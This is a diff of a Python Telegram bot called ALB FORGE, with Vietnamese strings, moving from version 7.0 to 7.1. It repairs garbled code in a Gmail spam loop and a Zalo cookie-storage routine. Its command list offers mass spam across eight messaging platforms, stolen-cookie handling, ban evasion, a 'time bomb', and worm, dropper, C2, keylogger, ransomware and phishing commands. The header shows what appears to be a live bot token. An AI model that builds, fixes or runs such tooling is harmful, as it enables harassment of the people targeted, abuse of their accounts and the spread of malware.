@@ -1,10 +1,20 @@
 # ============================================================
-# BOT BY ANH KHÔI — ALB FORGE v7.0
+# BOT BY ANH KHÔI — ALB FORGE v7.1
 # Telegram: 8908394974:AAEoCVzAtD8xc_2N49rHP43HUIGrTEkYGX4
 # Admin: 6094686933
 # ============================================================
-import os, re, sys, json, time, random, threading, asyncio
+import os
+import re
+import sys
+import json
+import time
+import random
+import threading
+import asyncio
+import warnings
 from datetime import datetime
+
+warnings.filterwarnings("ignore")
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
 from telegram.ext import (
@@ -48,7 +58,7 @@ ADMIN_IDS = [
     os.environ.get("ADMIN_IDS", "6094686933").split(",")
     if x.strip().isdigit()
 ]
-DATA_DIR = "data"
+DATA_DIR = os.environ.get("DATA_DIR", "/tmp/alb_data")
 os.makedirs(DATA_DIR, exist_ok=True)
 
 
@@ -238,7 +248,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⛔ Không có quyền.")
         return
     await update.message.reply_text(
-        "🔥 *ALB FORGE v7.0*\n"
+        "🔥 *ALB FORGE v7.1*\n"
         "_Bot by Anh Khôi_\n"
         "_7-Layer Firewall — Anti-Ban Elite_\n\n"
         "Chọn chức năng:",
@@ -990,6 +1000,7 @@ async def cmd_tele_spam(u, c):
     await u.message.reply_text(f"✅ Task `{task.id}`", parse_mode=ParseMode.MARKDOWN)
 
 
+# ============ GMAIL — FIXED SYNTAX ============
 @admin_only
 async def cmd_gmail_spam(u, c):
     t = u.message.text.replace("/gmail_spam ", "", 1)
@@ -999,26 +1010,29 @@ async def cmd_gmail_spam(u, c):
             "Cú pháp: /gmail_spam <email>|<pass>|<to>|<msg1;msg2>|<delay>")
         return
     import smtplib
+    import ssl as _ssl
     from email.mime.text import MIMEText
-    email_, pw, to = p[0].strip(), p[1].strip(), p[2].strip()
+
+    email_ = p[0].strip()
+    pw = p[1].strip()
+    to = p[2].strip()
     msgs = [x.strip() for x in p[3].split(";") if x.strip()]
     delay = max(10.0, float(p[4].strip()))
+
     task = Task(new_tid("gmail"), "gmail", u.effective_user.id)
 
     def w():
-        import ssl as _ssl
         i = 0
         while not task.stop.is_set():
             m = msgs[i % len(msgs)]
             i += 1
             try:
-               .get ctx = _ssl.create_default_context()
-                with smtplib.SM(TP_SSL("smtp.gmail.com", uid465, context=ctx) as s:
-                    s.login,(email_, pw)
+                ctx = _ssl.create_default_context()
+                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ctx) as s:
+                    s.login(email_, pw)
                     msg = MIMEText(m)
- {                    msg["From"] = email_
-                    msg["To"]})
- = to
+                    msg["From"] = email_
+                    msg["To"] = to
                     msg["Subject"] = " "
                     s.sendmail(email_, to, msg.as_string())
             except Exception as e:
@@ -1110,7 +1124,10 @@ async def cmd_wechat_spam(u, c):
             "Cú pháp: /wechat_spam <corpid>|<secret>|<agent>|<user>|<msgs>|<delay>")
         return
     import requests as rq
-    corpid, secret, agent, user = p[0].strip(), p[1].strip(), p[2].strip(), p[3].strip()
+    corpid = p[0].strip()
+    secret = p[1].strip()
+    agent = p[2].strip()
+    user = p[3].strip()
     msgs = [x.strip() for x in p[4].split(";") if x.strip()]
     delay = max(4.0, float(p[5].strip()))
     task = Task(new_tid("wechat"), "wechat", u.effective_user.id)
@@ -1173,7 +1190,8 @@ async def cmd_save_zalo(u, c):
         return
     imei, ck = t.split("|", 1)
     uid = str(u.effective_user.id)
-    d = COOKIES    lst = d.get("zalo", [])
+    d = COOKIES.get(uid, {})
+    lst = d.get("zalo", [])
     lst.append({"imei": imei.strip(), "cookies": json.loads(ck.strip())})
     d["zalo"] = lst
     COOKIES.set(uid, d)
@@ -1431,93 +1449,108 @@ async def cmd_rt_exploit(u, c):
 
 # ============ POST INIT ============
 async def post_init(app):
-    cmds = [
-        ("start", "Menu chính"),
-        ("fw_status", "Firewall 7 lớp"),
-        ("fw_reset", "Reset firewall"),
-        ("fw_antiban", "Anti-ban cookie"),
-        ("fw_risk", "Risk score"),
-        ("rate", "Rate config"),
-        ("rate_set", "Chỉnh rate"),
-        ("rate_reset", "Reset rate"),
-        ("rate_clear", "Clear manual"),
-        ("guard_status", "Guard health"),
-        ("guard_backup", "Backup all cookie"),
-        ("guard_warm", "Warm cookie"),
-        ("guard_safe", "Cookie safe check"),
-        ("cookie_fb", "Guide FB"),
-        ("cookie_zalo", "Guide Zalo"),
-        ("cookie_discord", "Guide Discord"),
-        ("cookie_telegram", "Guide Telegram"),
-        ("cookie_gmail", "Guide Gmail"),
-        ("cookie_ig", "Guide IG"),
-        ("cookie_wechat", "Guide WeChat"),
-        ("cookie_sms", "Guide SMS"),
-        ("fb_check", "Check FB"),
-        ("fb_token", "Token FB"),
-        ("fb_threads", "Box FB"),
-        ("fb_send", "Send FB"),
-        ("fb_spam", "Spam FB"),
-        ("fb_bio", "Bio"),
-        ("fb_name", "Name"),
-        ("fb_avatar", "Avatar"),
-        ("fb_cover", "Cover"),
-        ("fb_story", "Story"),
-        ("fb_theme", "Theme FB"),
-        ("fb_emoji", "Emoji FB"),
-        ("fb_nick", "Nick FB"),
-        ("fb_auto_bio", "Auto bio"),
-        ("fb_auto_avatar", "Auto avatar"),
-        ("fb_auto_cover", "Auto cover"),
-        ("fb_auto_story", "Auto story"),
-        ("zalo_qr", "QR login Zalo"),
-        ("zalo_check", "Check Zalo"),
-        ("zalo_groups", "Groups Zalo"),
-        ("zalo_spam", "Spam Zalo auto màu"),
-        ("zalo_color_list", "Bảng màu Zalo"),
-        ("zalo_color", "Spam màu Zalo"),
-        ("zalo_namecolor", "Màu tên Zalo"),
-        ("zalo_theme", "Theme Zalo"),
-        ("zalo_auto_theme", "Auto theme Zalo"),
-        ("discord_spam", "Spam Discord"),
-        ("tele_spam", "Spam Telegram"),
-        ("gmail_spam", "Spam Gmail"),
-        ("sms_spam", "Spam SMS"),
-        ("ig_spam", "Spam IG"),
-        ("wechat_spam", "Spam WeChat"),
-        ("save_fb", "Lưu FB"),
-        ("save_zalo", "Lưu Zalo"),
-        ("list_ck", "List cookie"),
-        ("del_ck", "Xóa cookie"),
-        ("warm_ck", "Warm cookie"),
-        ("nick", "Random nick"),
-        ("uid_extract", "Trích UID"),
-        ("ip_info", "Info IP"),
-        ("zombie", "Zombie spam"),
-        ("bomb", "Time bomb"),
-        ("backup_all", "Backup tất cả"),
-        ("tasks", "Tasks"),
-        ("stop", "Dừng task"),
-        ("stop_all", "Dừng hết"),
-        ("rt_worm", "Worm sim"),
-        ("rt_dropper", "Dropper"),
-        ("rt_c2", "C2"),
-        ("rt_keylog", "Keylog"),
-        ("rt_ransom", "Ransom"),
-        ("rt_phish", "Phish"),
-        ("rt_exploit", "Exploit sim"),
-    ]
-    await app.bot.set_my_commands([BotCommand(n, d) for n, d in cmds])
+    print("[POST_INIT] Bắt đầu setup...")
+    try:
+        cmds = [
+            ("start", "Menu chính"),
+            ("fw_status", "Firewall 7 lớp"),
+            ("fw_reset", "Reset firewall"),
+            ("fw_antiban", "Anti-ban cookie"),
+            ("fw_risk", "Risk score"),
+            ("rate", "Rate config"),
+            ("rate_set", "Chỉnh rate"),
+            ("rate_reset", "Reset rate"),
+            ("rate_clear", "Clear manual"),
+            ("guard_status", "Guard health"),
+            ("guard_backup", "Backup all cookie"),
+            ("guard_warm", "Warm cookie"),
+            ("guard_safe", "Cookie safe check"),
+            ("cookie_fb", "Guide FB"),
+            ("cookie_zalo", "Guide Zalo"),
+            ("cookie_discord", "Guide Discord"),
+            ("cookie_telegram", "Guide Telegram"),
+            ("cookie_gmail", "Guide Gmail"),
+            ("cookie_ig", "Guide IG"),
+            ("cookie_wechat", "Guide WeChat"),
+            ("cookie_sms", "Guide SMS"),
+            ("fb_check", "Check FB"),
+            ("fb_token", "Token FB"),
+            ("fb_threads", "Box FB"),
+            ("fb_send", "Send FB"),
+            ("fb_spam", "Spam FB"),
+            ("fb_bio", "Bio"),
+            ("fb_name", "Name"),
+            ("fb_avatar", "Avatar"),
+            ("fb_cover", "Cover"),
+            ("fb_story", "Story"),
+            ("fb_theme", "Theme FB"),
+            ("fb_emoji", "Emoji FB"),
+            ("fb_nick", "Nick FB"),
+            ("fb_auto_bio", "Auto bio"),
+            ("fb_auto_avatar", "Auto avatar"),
+            ("fb_auto_cover", "Auto cover"),
+            ("fb_auto_story", "Auto story"),
+            ("zalo_qr", "QR login Zalo"),
+            ("zalo_check", "Check Zalo"),
+            ("zalo_groups", "Groups Zalo"),
+            ("zalo_spam", "Spam Zalo auto màu"),
+            ("zalo_color_list", "Bảng màu Zalo"),
+            ("zalo_color", "Spam màu Zalo"),
+            ("zalo_namecolor", "Màu tên Zalo"),
+            ("zalo_theme", "Theme Zalo"),
+            ("zalo_auto_theme", "Auto theme Zalo"),
+            ("discord_spam", "Spam Discord"),
+            ("tele_spam", "Spam Telegram"),
+            ("gmail_spam", "Spam Gmail"),
+            ("sms_spam", "Spam SMS"),
+            ("ig_spam", "Spam IG"),
+            ("wechat_spam", "Spam WeChat"),
+            ("save_fb", "Lưu FB"),
+            ("save_zalo", "Lưu Zalo"),
+            ("list_ck", "List cookie"),
+            ("del_ck", "Xóa cookie"),
+            ("warm_ck", "Warm cookie"),
+            ("nick", "Random nick"),
+            ("uid_extract", "Trích UID"),
+            ("ip_info", "Info IP"),
+            ("zombie", "Zombie spam"),
+            ("bomb", "Time bomb"),
+            ("backup_all", "Backup tất cả"),
+            ("tasks", "Tasks"),
+            ("stop", "Dừng task"),
+            ("stop_all", "Dừng hết"),
+            ("rt_worm", "Worm sim"),
+            ("rt_dropper", "Dropper"),
+            ("rt_c2", "C2"),
+            ("rt_keylog", "Keylog"),
+            ("rt_ransom", "Ransom"),
+            ("rt_phish", "Phish"),
+            ("rt_exploit", "Exploit sim"),
+        ]
+        await app.bot.set_my_commands([BotCommand(n, d) for n, d in cmds])
+        print("[POST_INIT] Commands set OK")
+    except Exception as e:
+        print(f"[POST_INIT] Lỗi commands: {e}")
 
-    for uid, d in COOKIES.all().items():
-        for ck in d.get("fb", []):
-            stop = threading.Event()
-            GUARD3.start_warm_loop(ck, "fb", interval=1800, stop_event=stop)
+    try:
+        for uid, d in COOKIES.all().items():
+            for ck in d.get("fb", []):
+                stop = threading.Event()
+                GUARD3.start_warm_loop(ck, "fb", interval=1800, stop_event=stop)
+        print("[POST_INIT] Warm loops OK")
+    except Exception as e:
+        print(f"[POST_INIT] Lỗi warm: {e}")
+
     print("[BOT] Ready. Bot by Anh Khôi.")
 
 
 # ============ MAIN ============
 def main():
+    try:
+        asyncio.get_event_loop()
+    except RuntimeError:
+        asyncio.set_event_loop(asyncio.new_event_loop())
+
     app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
     app.add_handler(CommandHandler("start", cmd_start))
@@ -1607,7 +1640,7 @@ def main():
     app.add_handler(CommandHandler("rt_phish", cmd_rt_phish))
     app.add_handler(CommandHandler("rt_exploit", cmd_rt_exploit))
 
-    print("[ALB] Bot by Anh Khôi — starting v7.0...")
+    print("[ALB] Bot by Anh Khôi — starting v7.1...")
     app.run_polling(drop_pending_updates=True)
 
 
